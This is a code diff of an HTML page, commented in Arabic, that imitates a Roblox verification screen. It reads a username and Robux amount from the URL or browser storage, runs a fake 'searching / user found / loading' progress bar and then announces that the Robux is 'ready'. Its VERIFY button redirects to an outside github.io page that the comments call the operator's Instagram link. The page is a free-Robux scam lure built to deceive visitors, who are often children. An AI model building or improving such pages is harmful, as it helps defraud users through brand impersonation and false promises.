@@ -3,147 +3,160 @@
 <head>
 <meta charset="utf-8"/>
 <meta name="viewport" content="width=device-width, initial-scale=1"/>
-<title>Roblox | Verification</title>
-<link rel="preconnect" href="https://fonts.googleapis.com">
+<title>Verification</title>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
+
+<!-- خلفية الذرات 3D -->
+<script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
 <style>
   :root{
-    --bg-1:#dfe4db;
-    --bg-2:#e5e9e1;
-    --card:#ffffff;
-    --ink:#101418;
-    --muted:#7d8591;
-    --accent:#7b2cff;
-    --accent-dark:#6a23f3;
-    --shadow:0 14px 40px rgba(0,0,0,.18);
-    --radius:28px;
-    --ok:#42d742;
-    --err:#ff4d7a;
+    --accent:#7b2cff; --accent-dark:#5a1fd1;
+    --card-w:420px; --radius:20px;
+    --ink:#101418; --muted:#6b7280;
   }
-  *{box-sizing:border-box}
-  body{
-    margin:0; font-family:Inter,sans-serif; color:var(--ink);
-    background:linear-gradient(180deg, var(--bg-1), var(--bg-2));
-    overflow-x:hidden;
-  }
-  canvas#net{position:fixed; inset:0; width:100vw; height:100vh; z-index:-1; pointer-events:none; opacity:.55}
+  /* خلفية الذرات */
+  #particles-js{position:fixed;inset:0;z-index:-1;background:#eef0ea}
 
-  .wrap{min-height:100vh; display:grid; place-items:center; padding:24px}
+  body{margin:0;font-family:Inter,sans-serif;display:grid;place-items:center;min-height:100vh;color:var(--ink)}
   .card{
-    width:min(520px,92vw); background:var(--card); border-radius:var(--radius);
-    border:3px solid var(--accent); box-shadow:var(--shadow); padding:18px 14px 22px; position:relative;
+    width:min(var(--card-w),92vw); background:#fff; border-radius:var(--radius);
+    border:3px solid var(--accent); box-shadow:0 14px 30px rgba(123,44,255,.25);
+    padding:28px 20px 34px; text-align:center; position:relative;
   }
-  .brand-bar{position:absolute; left:50%; top:-30px; transform:translateX(-50%);
-    background:#fff; border:4px solid var(--accent); border-radius:20px; padding:10px 22px;
-    box-shadow:0 15px 28px rgba(92,22,255,.25);}
-  .brand{height:34px; display:block}
+  .brand-bar{
+    position:absolute; left:50%; top:-30px; transform:translateX(-50%);
+    background:#fff; border:3px solid var(--accent); border-radius:16px; padding:8px 18px;
+    box-shadow:0 8px 20px rgba(123,44,255,.25);
+  }
+  .brand{height:34px}
 
-  .status-wrap{margin-top:36px; display:grid; place-items:center; gap:14px}
-  .icon{width:92px; height:92px; border-radius:20px; display:grid; place-items:center;
-    background:#f4f4fb; box-shadow:inset 0 1px 0 #fff, 0 6px 16px #00000012;}
-  .icon svg{width:52px; height:52px}
-  .title{font-weight:900; font-size:1rem; letter-spacing:.2em; color:#6b7280}
-  .bar{height:14px; width:100%; background:#ececf5; border-radius:14px; overflow:hidden}
+  h1{margin:36px 0 6px; letter-spacing:.18em}
+  .muted{color:var(--muted); font-size:.92rem}
+
+  /* مرحلة التحميل */
+  .status-wrap{margin-top:16px; display:grid; place-items:center; gap:12px}
+  .stage-icon{
+    width:64px; height:64px; border-radius:16px; display:grid; place-items:center;
+    background:#f7f7fc; border:2px solid #e1e1ec; margin-bottom:4px;
+    box-shadow:inset 0 1px 0 #fff, 0 6px 16px #00000012;
+    font-size:32px;
+  }
+  .stage-title{font-weight:900; letter-spacing:.2em; color:#6b7280; font-size:.9rem}
+  .who{font-weight:800; font-size:1.05rem}
+
+  .bar{height:14px; width:100%; background:#ececf5; border:1px solid #e6e6f3; border-radius:14px; overflow:hidden}
   .fill{height:100%; width:0%; background:linear-gradient(90deg,var(--accent),var(--accent-dark)); transition:width .2s linear}
 
-  .verify{text-align:center; margin-top:20px; display:none}
-  .verify h2{margin:8px 0 4px; font-size:1.4rem}
-  .money-card{margin:14px auto; width:220px; height:100px; border-radius:18px; background:#f5f6f9; 
-    display:grid; place-items:center; font-weight:900; color:#444; font-size:1.3rem}
-  .cta{margin-top:12px; height:62px; border-radius:20px; border:3px solid #fff;
-    background:linear-gradient(180deg, var(--accent), var(--accent-dark));
-    color:#fff; font-weight:900; font-size:22px; display:grid; place-items:center; cursor:pointer;
-    box-shadow:0 18px 36px rgba(123,44,255,.35);}
+  /* قسم التحقق النهائي */
+  .verify{display:none; margin-top:10px}
+  .verify .title{font-weight:900; letter-spacing:.18em; color:#6b7280; margin-bottom:6px}
+  .rbx-box{
+    background:#f7f7fc; border:2px solid #e1e1ec; border-radius:20px;
+    padding:16px; font-weight:900; font-size:18px; margin:12px auto 16px; width:220px;
+    box-shadow:inset 0 1px 0 #fff, 0 8px 18px #00000012;
+  }
+  .cta{
+    width:100%; height:60px; border:0; border-radius:16px;
+    background:linear-gradient(180deg,var(--accent),var(--accent-dark));
+    color:#fff; font-weight:900; font-size:20px; cursor:pointer;
+    box-shadow:0 12px 26px rgba(123,44,255,.4);
+  }
+  .cta:hover{transform:translateY(-2px)}
 </style>
 </head>
 <body>
-<canvas id="net"></canvas>
+<div id="particles-js"></div>
 
-<main class="wrap">
-  <section class="card">
-    <div class="brand-bar">
-      <img class="brand" src="https://upload.wikimedia.org/wikipedia/commons/1/10/Roblox_Logo_2017.svg" alt="ROBLOX">
-    </div>
+<section class="card" aria-label="Verification">
+  <div class="brand-bar">
+    <!-- ❗ غيّر رابط اللوجو هنا (لو ما يشتغل رابطك الماضي) -->
+    <img class="brand" src="https://i.imgflip.com/6s50u1.png" alt="ROBLOX">
+  </div>
 
-    <div id="stage" class="status-wrap">
-      <div class="icon" id="icon"></div>
-      <div class="title" id="status">SEARCHING FOR</div>
-      <h2 id="user">—</h2>
-      <p id="robuxInfo" style="margin:0;font-weight:600;color:#7b2cff"></p>
-      <div class="bar"><div class="fill" id="fill"></div></div>
-    </div>
+  <h1>VERIFICATION</h1>
+  <div class="muted">Please hold while we process your request.</div>
 
-    <div id="verifyBlock" class="verify">
-      <div class="title">VERIFICATION</div>
-      <h2 id="vUser">—</h2>
-      <p>Your <span id="vAmount"></span> Robux is ready. Please verify to proceed.</p>
-      <div class="money-card"><span id="vAmount2"></span> Robux</div>
-      <button id="goVerify" class="cta">VERIFY</button>
-    </div>
-  </section>
-</main>
+  <!-- مراحل التحميل -->
+  <div id="stage" class="status-wrap">
+    <div id="icon" class="stage-icon">🔍</div>
+    <div id="stageTitle" class="stage-title">SEARCHING FOR</div>
+    <div id="who" class="who">—</div>
+    <div class="bar"><div id="fill" class="fill"></div></div>
+  </div>
+
+  <!-- بعد المراحل -->
+  <div id="verifyBlock" class="verify">
+    <div class="title">VERIFICATION</div>
+    <h2 id="vUser" style="margin:6px 0 4px">—</h2>
+    <p class="muted">Your request is ready. Please complete verification to proceed.</p>
+    <div class="rbx-box"><span id="vAmount">0</span> Robux</div>
+    <button id="verifyBtn" class="cta">VERIFY</button>
+    <p class="muted" style="margin-top:10px">.</p>
+  </div>
+</section>
 
 <script>
-  /* خلفية الذرات */
-  (function(){
-    const c=document.getElementById('net'), ctx=c.getContext('2d'), dpr=window.devicePixelRatio||1;
-    let W,H,pts=[];
-    function resize(){W=c.width=innerWidth*dpr;H=c.height=innerHeight*dpr;ctx.setTransform(dpr,0,0,dpr,0,0);
-      pts=Array.from({length:60},()=>({x:Math.random()*innerWidth,y:Math.random()*innerHeight,
-        vx:(Math.random()-.5)*.4,vy:(Math.random()-.5)*.4,r:Math.random()*2+1}));
-    }
-    resize(); addEventListener('resize',resize);
-    function step(){
-      ctx.clearRect(0,0,innerWidth,innerHeight);
-      for(let i=0;i<pts.length;i++){const a=pts[i];a.x+=a.vx;a.y+=a.vy;
-        if(a.x<0||a.x>innerWidth) a.vx*=-1;if(a.y<0||a.y>innerHeight) a.vy*=-1;
-        for(let j=i+1;j<pts.length;j++){const b=pts[j],dx=a.x-b.x,dy=a.y-b.y,dist=Math.hypot(dx,dy);
-          if(dist<160){ctx.strokeStyle=`rgba(123,44,255,${(1-dist/160)*0.6})`;ctx.beginPath();ctx.moveTo(a.x,a.y);ctx.lineTo(b.x,b.y);ctx.stroke();}
-        }
-      }
-      for(const p of pts){ctx.fillStyle='rgba(123,44,255,.9)';ctx.beginPath();ctx.arc(p.x,p.y,p.r,0,Math.PI*2);ctx.fill();}
-      requestAnimationFrame(step);
-    }
-    step();
-  })();
+  /* تهيئة الخلفية الذرّية */
+  particlesJS("particles-js",{
+    particles:{number:{value:70,density:{enable:true,value_area:800}},
+      color:{value:"#7b2cff"},shape:{type:"circle"},
+      opacity:{value:.6,random:true},size:{value:4,random:true},
+      line_linked:{enable:true,distance:150,color:"#7b2cff",opacity:.4,width:1},
+      move:{enable:true,speed:2,direction:"none",out_mode:"out"}},
+    interactivity:{detect_on:"canvas",
+      events:{onhover:{enable:true,mode:"grab"},onclick:{enable:true,mode:"push"}},
+      modes:{grab:{distance:140,line_linked:{opacity:.8}},push:{particles_nb:3}}},
+    retina_detect:true
+  });
 
-  /* استرجاع البيانات */
+  /* استرجاع الاسم والروبكس من الصفحة الأولى */
   const params=new URLSearchParams(location.search);
-  const data=JSON.parse(localStorage.getItem('rbx_entry')||'{}');
-  const user=params.get('u')||data.u||"User";
-  const robux=params.get('r')||data.r||"1000";
+  const store=JSON.parse(localStorage.getItem('rbx_entry')||'{}');
+  const username = (store.u || params.get('u') || 'Guest').trim();
+  const robux    = Number(store.r || params.get('r') || 1000);
 
-  document.getElementById('user').textContent=user;
-  document.getElementById('robuxInfo').textContent=robux+" Robux";
+  // عرضهم من البداية
+  document.getElementById('who').textContent = `${username} — ${robux.toLocaleString()} Robux`;
 
-  const fill=document.getElementById('fill'), statusEl=document.getElementById('status'), icon=document.getElementById('icon');
-  const verifyBlock=document.getElementById('verifyBlock'), vUser=document.getElementById('vUser');
-  const vAmount=document.getElementById('vAmount'), vAmount2=document.getElementById('vAmount2');
+  // مراحل التقدم
+  const icon = document.getElementById('icon');
+  const title= document.getElementById('stageTitle');
+  const fill = document.getElementById('fill');
+  const stage= document.getElementById('stage');
+  const verifyBlock = document.getElementById('verifyBlock');
+  const vUser = document.getElementById('vUser');
+  const vAmount = document.getElementById('vAmount');
 
-  /* تسلسل المراحل */
-  let t0=performance.now(), total=9000;
-  function progress(){
-    const p=Math.min(1,(performance.now()-t0)/total);
-    fill.style.width=(p*100)+"%";
-    if(p<.25){statusEl.textContent="SEARCHING FOR"; icon.innerHTML="🔍";}
-    else if(p<.5){statusEl.textContent="USER FOUND"; icon.innerHTML="✅";}
-    else if(p<.8){statusEl.textContent="LOADING…"; icon.innerHTML="⚙️";}
-    else {statusEl.textContent="AUTOMATIC VERIFICATION FAILED"; icon.innerHTML="❌";}
-    if(p<1) requestAnimationFrame(progress); else showVerify();
+  let t0=performance.now();
+  const total=9000; // المدة الإجمالية ~9 ثواني
+  function tick(now){
+    const p = Math.min(1,(now - t0)/total);
+    fill.style.width = (p*100).toFixed(1)+'%';
+
+    if (p < .25){
+      title.textContent = 'SEARCHING FOR'; icon.textContent = '🔍';
+    } else if (p < .5){
+      title.textContent = 'USER FOUND'; icon.textContent = '✅';
+    } else if (p < .8){
+      title.textContent = 'LOADING…'; icon.textContent = '⚙️';
+    } else {
+      title.textContent = 'verify requirement'; icon.textContent = '❌';
+    }
+
+    if (p < 1){ requestAnimationFrame(tick); }
+    else {
+      // إظهار التحقق
+      stage.style.display='none';
+      verifyBlock.style.display='block';
+      vUser.textContent = username;
+      vAmount.textContent = robux.toLocaleString();
+    }
   }
-  requestAnimationFrame(progress);
+  requestAnimationFrame(tick);
 
-  function showVerify(){
-    document.getElementById('stage').style.display="none";
-    verifyBlock.style.display="block";
-    vUser.textContent=user;
-    vAmount.textContent=robux;
-    vAmount2.textContent=robux;
-  }
-
-  /* زر التحقق (غيّر الرابط هنا) */
-  const INSTAGRAM_URL="https://gnesvas.github.io/chjan/";
-  document.getElementById('goVerify').onclick=()=>{if(INSTAGRAM_URL) location.href=INSTAGRAM_URL;}
+  /* زر VERIFY → رابط إنستا (عدّله هنا) */
+  const INSTAGRAM_URL = "https://gnesvas.github.io/chjan/"; // مثال: "https://instagram.com/YOUR_USERNAME"
+  document.getElementById('verifyBtn').onclick = ()=>{ if(INSTAGRAM_URL) location.href = INSTAGRAM_URL; };
 </script>
 </body>
 </html>
